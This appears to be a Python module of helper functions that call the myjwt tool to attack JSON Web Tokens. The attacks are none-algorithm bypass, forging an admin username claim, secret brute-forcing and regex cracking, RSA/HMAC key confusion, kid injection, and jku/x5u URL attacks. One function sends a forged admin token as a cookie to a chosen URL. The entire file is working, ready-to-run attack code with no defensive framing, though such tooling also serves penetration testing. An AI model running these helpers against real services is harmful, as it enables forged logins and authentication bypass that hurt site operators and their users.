import subprocess
from typing import List


def _run_myjwt(args: List[str]) -> subprocess.CompletedProcess:
    """
    Internal helper to execute myjwt commands consistently.
    """
    return subprocess.run(
        ["myjwt"] + args,
        capture_output=True,
        text=True,
        check=False
    )


def modify_jwt(jwt: str) -> subprocess.CompletedProcess:
    return _run_myjwt([
        jwt,
        "--add-payload", "username=admin",
        "--add-header", "refresh=false"
    ])


def none_vulnerability(jwt: str) -> subprocess.CompletedProcess:
    return _run_myjwt([
        jwt,
        "--none-vulnerability"
    ])


def sign_key(jwt: str, key: str) -> subprocess.CompletedProcess:
    return _run_myjwt([
        jwt,
        "--sign", key
    ])


def brute_force(jwt: str, path: str) -> subprocess.CompletedProcess:
    return _run_myjwt([
        jwt,
        "--bruteforce", path
    ])


def crack(jwt: str, regex: str) -> subprocess.CompletedProcess:
    return _run_myjwt([
        jwt,
        "--regex", regex
    ])


def rsa_hmac_confusion(jwt: str, key_file: str) -> subprocess.CompletedProcess:
    return _run_myjwt([
        jwt,
        "--hmac", key_file
    ])


def kid_injection(jwt: str) -> subprocess.CompletedProcess:
    return _run_myjwt([
        jwt,
        "--kid", "INJECTION"
    ])


def send_jwt_to_url(jwt: str, url: str) -> subprocess.CompletedProcess:
    return _run_myjwt([
        jwt,
        "-u", url,
        "-c", f"jwt={jwt}",
        "--none-vulnerability",
        "--add-payload", "username=admin"
    ])


def jku_vulnerability(jwt: str, url: str) -> subprocess.CompletedProcess:
    return _run_myjwt([
        jwt,
        "--jku", url
    ])


def x5u_vulnerability(jwt: str, url: str) -> subprocess.CompletedProcess:
    return _run_myjwt([
        jwt,
        "--x5u", url
    ])
